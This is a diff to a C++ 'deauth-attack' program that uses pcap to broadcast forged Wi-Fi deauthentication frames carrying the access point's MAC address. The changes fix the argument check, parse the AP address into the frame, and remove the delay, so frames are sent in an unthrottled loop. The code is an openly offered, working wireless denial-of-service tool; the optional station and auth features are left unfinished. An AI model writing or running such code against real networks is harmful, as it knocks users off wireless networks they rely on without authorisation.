@@ -1,5 +1,4 @@
 #include <iostream>
-#include <vector>
 #include <string>
 #include <stdio.h>
 #include <header.h>
@@ -7,9 +6,10 @@
 void usage()
 {
     std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]" << std::endl;
-    std::cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
+    std::cout << "sample : deauth-attack mon0 11:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
 }
 
+/*
 struct Param {
 	bool auth{false};
 
@@ -22,17 +22,24 @@ struct Param {
 		}
 	}
 } param;
+*/
 
 int main(int argc, char *argv[])
 {
-    if(argc != 4 || argc != 5) {
+    if(argc != 4 && argc != 5) {
         usage();
         return 0;
     }
 
     char* interface = argv[1];
-    char* ap_mac = argv[2];
-    char* sta_mac = argv[3];
+    uint8_t ap_mac[6];
+    int i = 0;
+
+    for(i=0; i<6; i++) {
+        ap_mac[i] = strtol(argv[2], NULL, 16);
+        argv[2] += 3;
+    }
+
     char errbuf[PCAP_ERRBUF_SIZE];
 
     pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
@@ -41,14 +48,16 @@ int main(int argc, char *argv[])
             return -1;
     }
 
-    Deauth_packet packet;
+    Deauth_packet packets;
+    for(i=0; i<6; i++) {
+        packets.d_frame.trans_src_bssid_addr[i] = ap_mac[i];
+    }
 
     while(true) {
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(Deauth_packet));
+        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packets), sizeof(Deauth_packet));
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
-        sleep(1);
     }
 
     pcap_close(handle);
